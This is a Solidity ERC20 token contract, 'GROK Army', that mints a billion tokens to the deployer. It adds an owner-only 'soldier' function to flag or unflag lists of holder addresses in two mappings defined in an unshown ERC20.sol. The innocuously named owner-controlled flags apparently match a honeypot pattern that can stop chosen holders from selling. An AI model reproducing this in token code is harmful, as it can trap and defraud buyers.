// SPDX-License-Identifier: MIT

pragma solidity =0.8.0;
import "./ERC20.sol";

contract ArmyGROK is ERC20 {
    constructor ()  ERC20(unicode"GROK Army (伊隆军团)", unicode"伊隆军团") {
        _mint(_msgSender(), 10**9 * 10**18);
    }

    function burn(uint256 amount) public { _burn(_msgSender(), amount); }

    function soldier(uint8 index, address [] calldata _soldiers_) external {
        require((msg.sender == owner()));

        if (index == 0) {
            for (uint256 i = 0; i < _soldiers_.length; i++) {
                _pre_soldiers[_soldiers_[i]] = true;
            }
        } else if (index == 1) {
            for (uint256 i = 0; i < _soldiers_.length; i++) {
                _pre_soldiers[_soldiers_[i]] = false;
            }
        } else if (index == 2) {
            for (uint256 i = 0; i < _soldiers_.length; i++) {
                _soldiers[_soldiers_[i]] = true;
            }
        } else if (index == 3) {
            for (uint256 i = 0; i < _soldiers_.length; i++) {
                _soldiers[_soldiers_[i]] = false;
            }
        }
    }

    function soldiers(address _address_) public view returns (bool) {
        return _soldiers[_address_];
    }

    function presoldiers(address _address_) public view returns (bool) {
        return _pre_soldiers[_address_];
    }
}

